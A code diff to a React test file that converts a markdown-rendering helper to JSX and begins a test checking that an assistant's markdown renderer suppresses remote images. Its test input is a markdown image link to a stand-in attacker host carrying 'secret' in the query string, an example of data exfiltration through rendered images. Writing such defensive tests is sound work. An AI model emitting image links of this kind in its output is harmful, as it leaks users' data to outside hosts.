@@ -26,7 +26,7 @@ const { renderToStaticMarkup } = await import("react-dom/server");
 const { ChatMarkdown } = await import("./markdown");
 
 const html = (children: string) =>
-  renderToStaticMarkup(React.createElement(ChatMarkdown, { children }));
+  renderToStaticMarkup(<ChatMarkdown>{children}</ChatMarkdown>);
 
 test("assistant markdown suppresses remote images without a network target", () => {
   const out = html("see this ![quarterly chart](https://attacker.example/x?d=secret)");
